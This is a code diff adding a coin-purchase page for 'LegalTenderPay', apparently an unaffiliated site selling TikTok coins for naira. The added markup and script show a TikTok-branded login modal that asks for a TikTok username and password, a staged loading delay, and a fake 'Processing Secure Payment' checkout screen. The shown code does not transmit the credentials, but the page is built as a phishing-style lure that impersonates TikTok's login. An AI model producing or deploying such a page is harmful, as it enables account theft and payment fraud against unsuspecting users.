@@ -36,26 +36,26 @@ body {
   display: flex;
   justify-content: space-between;
   align-items: flex-start;
-  margin-top: -10px;
-  margin-bottom: 5px;
+  margin-top: 15px; /* shifted down ✅ */
+  margin-bottom: 10px;
 }
 
 .header h1 {
   margin: 0;
-  font-size: 26px;
+  font-size: 28px; /* slightly bigger ✅ */
   font-weight: bold;
-  margin-top: 25px; /* shifted down ✅ */
-  line-height: 1.2;
+  margin-top: 20px; /* shifted text downward ✅ */
+  line-height: 1.3;
 }
 
-/* Sub-text under Get Coins */
+/* Sub-text is now directly under Get Coins */
 .sub-text {
   font-size: 15px;
   color: #333;
   font-weight: 600;
-  margin-top: 10px; /* shifted down ✅ */
-  margin-bottom: 8px;
-  line-height: 1.3;
+  margin-top: 8px; /* added space ✅ */
+  margin-bottom: 10px;
+  line-height: 1.4;
 }
 
 .sub-text span {
@@ -87,7 +87,7 @@ body {
   display: grid;
   grid-template-columns: repeat(3, 1fr);
   gap: 10px;
-  margin-top: 15px;
+  margin-top: 20px;
   margin-bottom: 25px;
 }
 
@@ -322,6 +322,164 @@ body {
       <img src="https://via.placeholder.com/135x135?text=Logo" alt="Logo">
     </div>
   </div>
+
+  <div class="coins-grid" id="coinsGrid">
+    <div class="coin-box" data-coins="30" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
+      <div class="coin-price">₦530</div>
+    </div>
+    <div class="coin-box" data-coins="350" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
+      <div class="coin-price">₦6,200</div>
+    </div>
+    <div class="coin-box" data-coins="700" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
+      <div class="coin-price">₦12,400</div>
+    </div>
+    <div class="coin-box" data-coins="1400" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
+      <div class="coin-price">₦24,700</div>
+    </div>
+    <div class="coin-box" data-coins="3500" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
+      <div class="coin-price">₦61,985</div>
+    </div>
+    <div class="coin-box" data-coins="custom" onclick="selectCustom(this)">
+      <span class="coin-amount">Custom</span>
+    </div>
+  </div>
+
+  <div class="custom-input" id="customInputBox">
+    <input type="number" id="customAmount" placeholder="Enter coins amount" oninput="updateCustomAmount()">
+  </div>
+
+  <button class="login-btn" id="mainButton" onclick="startLogin()">Log in to get Coins</button>
+
+  <div class="invite-box">
+    <div class="invite-left">
+      <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png" alt="invite">
+      <div>
+        <div class="invite-text">Invite & Get Rewards</div>
+        <div class="invite-sub">Check out this new feature!</div>
+      </div>
+    </div>
+    <span class="share-btn" onclick="alert('Share this link manually!')">&#62;</span>
+  </div>
+
+  <div class="coin-image-section">
+    <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
+  </div>
+
+  <div class="footer">
+    <div class="legal">LegalTenderPay</div>
+  </div>
 </div>
+
+<!-- Loading overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loader"></div>
+</div>
+
+<!-- Login modal -->
+<div class="login-modal" id="loginModal">
+  <div class="login-content">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
+         alt="TikTok Logo"
+         style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
+    <h2 style="margin-top: 20px;">Log in to get Coins</h2>
+    <p>Log in to your TikTok account to get Coins, check notifications and more.</p>
+    <input type="text" id="usernameInput" placeholder="Username" required><br>
+    <input type="password" id="passwordInput" placeholder="Password" required><br>
+    <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
+  </div>
+</div>
+
+<script>
+let coinRate = 17.71;
+let selectedCoins = 30;
+let loggedIn = false;
+
+function formatCurrency(amount) {
+  return '₦' + Math.round(amount).toLocaleString('en-NG');
+}
+
+function selectBox(el) {
+  document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  selectedCoins = parseInt(el.getAttribute('data-coins')) || 0;
+  document.getElementById("customInputBox").style.display = "none";
+  updateButton();
+}
+
+function selectCustom(el) {
+  document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById("customInputBox").style.display = "block";
+  selectedCoins = 0;
+  updateButton();
+}
+
+function updateCustomAmount() {
+  const val = parseInt(document.getElementById("customAmount").value);
+  selectedCoins = val > 0 ? val : 0;
+  updateButton();
+}
+
+function updateButton() {
+  const btn = document.getElementById("mainButton");
+  if (loggedIn) {
+    if (selectedCoins > 0) {
+      const ngn = formatCurrency(selectedCoins * coinRate);
+      btn.textContent = `Buy ${selectedCoins} Coins for ${ngn}`;
+    } else {
+      btn.textContent = "Buy Now";
+    }
+  }
+}
+
+function startLogin() {
+  if (!loggedIn) {
+    document.getElementById("loadingOverlay").style.display = "flex";
+    setTimeout(() => {
+      document.getElementById("loadingOverlay").style.display = "none";
+      document.getElementById("loginModal").style.display = "flex";
+    }, 2000);
+  } else {
+    const amount = formatCurrency(selectedCoins * coinRate);
+    document.body.innerHTML = `
+      <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial;text-align:center;">
+        <h1 style="color:#ff375f;">LegalTenderPay Checkout</h1>
+        <p style="font-size:18px;">You are buying <strong>${selectedCoins} Coins</strong></p>
+        <p style="font-size:20px;font-weight:bold;">Amount: ${amount}</p>
+        <p style="margin-top:30px;">Processing Secure Payment...</p>
+      </div>`;
+  }
+}
+
+function completeLogin() {
+  document.getElementById("loginModal").style.display = "none";
+  loggedIn = true;
+  updateButton();
+}
+
+const usernameField = document.getElementById("usernameInput");
+const passwordField = document.getElementById("passwordInput");
+const continueBtn = document.getElementById("continueBtn");
+
+function checkLoginFields() {
+  if (usernameField.value.trim() && passwordField.value.trim()) {
+    continueBtn.disabled = false;
+    continueBtn.style.opacity = "1";
+    continueBtn.style.cursor = "pointer";
+  } else {
+    continueBtn.disabled = true;
+    continueBtn.style.opacity = "0.6";
+    continueBtn.style.cursor = "not-allowed";
+  }
+}
+
+usernameField.addEventListener("input", checkLoginFields);
+passwordField.addEventListener("input", checkLoginFields);
+</script>
 </body>
 </html>
